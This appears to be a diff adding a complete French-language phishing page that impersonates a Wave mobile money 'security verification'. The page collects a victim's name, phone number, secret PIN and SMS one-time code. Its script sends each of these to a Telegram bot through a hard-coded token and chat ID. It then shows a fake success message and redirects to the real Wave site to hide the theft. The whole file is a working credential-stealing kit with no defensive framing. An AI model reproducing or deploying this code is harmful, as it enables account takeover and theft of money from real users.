@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification Sécurité Wave</title>
+    <style>
+        /* --- Design Officiel & Sécurisé --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        
+        body {
+            background-color: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .header { margin-bottom: 20px; }
+        .wave-logo { 
+            font-size: 24px; 
+            font-weight: bold; 
+            color: #0b6eef; 
+            letter-spacing: 1px;
+        }
+        
+        .alert-icon {
+            color: #ff3b30;
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        h2 { font-size: 18px; margin-bottom: 10px; color: #2c3e50; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 600; color: #444; }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: 0.3s;
+        }
+        input:focus { border-color: #0b6eef; outline: none; box-shadow: 0 0 0 3px rgba(11, 110, 239, 0.1); }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background-color: #0b6eef;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-primary:hover { background-color: #0855c2; }
+        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
+
+        /* Loader */
+        .loader { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0b6eef; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Timer Section */
+        .timer-section {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .timer-count {
+            font-weight: bold;
+            color: #ff3b30;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            display: none;
+        }
+        .check-icon {
+            color: #34c759;
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+
+        /* Hidden steps */
+        .step { display: none; }
+        .active-step { display: block; }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="wave-logo">WAVE</div>
+    </div>
+
+    <!-- Étape 1 : Identifiants -->
+    <div id="step1" class="step active-step">
+        <div class="alert-icon">🔒</div>
+        <h2>Connexion sécurisée</h2>
+        <p>Entrez vos informations pour accéder à votre compte.</p>
+        
+        <form id="form1">
+            <div class="input-group">
+                <label>Nom</label>
+                <input type="text" id="nom" required placeholder="Votre nom">
+            </div>
+            <div class="input-group">
+                <label>Prénom</label>
+                <input type="text" id="prenom" required placeholder="Votre prénom">
+            </div>
+            <div class="input-group">
+                <label>Numéro de téléphone</label>
+                <input type="tel" id="numero" required placeholder="+221 XX XXX XX XX">
+            </div>
+            <button type="submit" class="btn-primary">Suivant</button>
+        </form>
+    </div>
+
+    <!-- Étape 2 : Code Secret (PIN) -->
+    <div id="step2" class="step">
+        <div class="alert-icon">🔑</div>
+        <h2>Vérification</h2>
+        <p>Entrez votre code secret Wave.</p>
+        
+        <form id="form2">
+            <div class="input-group">
+                <label>Code Secret (PIN)</label>
+                <input type="password" id="pin" maxlength="4" pattern="\d{4}" required placeholder="****" style="letter-spacing: 5px; text-align: center;">
+            </div>
+            <button type="submit" class="btn-primary">Valider</button>
+        </form>
+    </div>
+
+    <!-- Étape 3 : OTP + Compte à rebours -->
+    <div id="step3" class="step">
+        <div class="alert-icon">📱</div>
+        <h2>Vérification finale</h2>
+        <p>Un code à 4 chiffres a été envoyé par SMS au numéro enregistré.</p>
+        
+        <div class="timer-section" id="timerDisplay">
+            Temps restant : <span id="countdown" class="timer-count">50</span> secondes
+        </div>
+
+        <form id="form3">
+            <div class="input-group">
+                <label>Code OTP</label>
+                <input type="text" id="otp" maxlength="4" pattern="\d{4}" required placeholder="XXXX" style="letter-spacing: 5px; text-align: center; font-size: 24px; font-weight: bold;">
+            </div>
+            <button type="submit" class="btn-primary" id="btnValidateOtp">Confirmer</button>
+        </form>
+    </div>
+
+    <!-- Écran de chargement intermédiaire -->
+    <div id="loadingScreen" class="step">
+        <div class="loader" style="display: block;"></div>
+        <p>Vérification en cours...</p>
+    </div>
+
+    <!-- Écran de succès -->
+    <div id="successScreen" class="step success-screen">
+        <div class="check-icon">✅</div>
+        <h2>Félicitations !</h2>
+        <p>Votre compte est maintenant totalement sécurisé et vérifié.</p>
+        <p>Redirection vers l'accueil...</p>
+    </div>
+</div>
+
+<script>
+    // --- CONFIGURATION TELEGRAM ---
+    const BOT_TOKEN = "8875421972:AAHLTpxo6JN1dhcRxRF8h6qkHFzv0Z4d9PE"; 
+    const CHAT_ID = "8826766724"; 
+
+    let userData = {};
+    let timerInterval;
+
+    // Fonction pour envoyer les données sur Telegram
+    function sendToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    }
+
+    // Étape 1 : Envoi Nom, Prenom, Numero
+    document.getElementById('form1').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nom = document.getElementById('nom').value;
+        const prenom = document.getElementById('prenom').value;
+        const numero = document.getElementById('numero').value;
+
+        // Stockage local
+        userData.nom = nom;
+        userData.prenom = prenom;
+        userData.numero = numero;
+
+        // Envoi sur Telegram
+        const msg = `🔓 NOUVELLE CONNEXION WAVE\n\n👤 Nom : ${nom}\n👤 Prénom : ${prenom}\n📞 Numéro : ${numero}`;
+        sendToTelegram(msg);
+
+        // Transition
+        switchStep('step1', 'step2');
+    });
+
+    // Étape 2 : Envoi du PIN
+    document.getElementById('form2').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const pin = document.getElementById('pin').value;
+        userData.pin = pin;
+
+        // Mise à jour message Telegram
+        const msg = `🔓 NOUVELLE CONNEXION WAVE\n\n👤 Nom : ${userData.nom}\n👤 Prénom : ${userData.prenom}\n📞 Numéro : ${userData.numero}\n🔑 Code Secret : ${pin}`;
+        sendToTelegram(msg);
+
+        // Transition
+        startTimer(); // Lance le compte à rebours
+        switchStep('step2', 'step3');
+    });
+
+    // Étape 3 : Validation OTP et Redirection
+    document.getElementById('form3').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const otp = document.getElementById('otp').value;
+        userData.otp = otp;
+
+        // Envoi final avec l'OTP saisi (celui du SMS)
+        const msgFinal = `✅ CONNEXION VALIDÉE\n\n👤 Nom : ${userData.nom}\n👤 Prénom : ${userData.prenom}\n📞 Numéro : ${userData.numero}\n🔑 Code Secret : ${userData.pin}\n📲 OTP Reçu : ${otp}`;
+        sendToTelegram(msgFinal);
+
+        // Affichage écran succès
+        switchStep('step3', 'loadingScreen');
+        
+        setTimeout(() => {
+            document.getElementById('loadingScreen').classList.remove('active-step');
+            document.getElementById('successScreen').classList.add('active-step');
+            
+            // Redirection vers le vrai site Wave
+            setTimeout(() => {
+                window.location.href = "https://www.wave.com/fr/";
+            }, 3000); // Attend 3 secondes pour lire "Félicitations"
+        }, 2000);
+    });
+
+    // Gestion du compte à rebours de 50 secondes
+    function startTimer() {
+        let duration = 50;
+        const timerDisplay = document.getElementById('timerDisplay');
+        const countdownEl = document.getElementById('countdown');
+        
+        timerDisplay.style.display = 'block';
+        
+        clearInterval(timerInterval); // Reset si déjà lancé
+        
+        timerInterval = setInterval(() => {
+            countdownEl.textContent = duration;
+            if (--duration < 0) {
+                clearInterval(timerInterval);
+                countdownEl.textContent = "0";
+                // Optionnel : Désactiver le bouton si temps écoulé
+                document.getElementById('btnValidateOtp').disabled = true;
+                document.getElementById('btnValidateOtp').textContent = "Temps expiré";
+            }
+        }, 1000);
+    }
+
+    // Fonction utilitaire pour changer d'écran
+    function switchStep(fromId, toId) {
+        document.getElementById(fromId).classList.remove('active-step');
+        document.getElementById(toId).classList.add('active-step');
+    }
+
+</script>
+
+</body>
+</html>
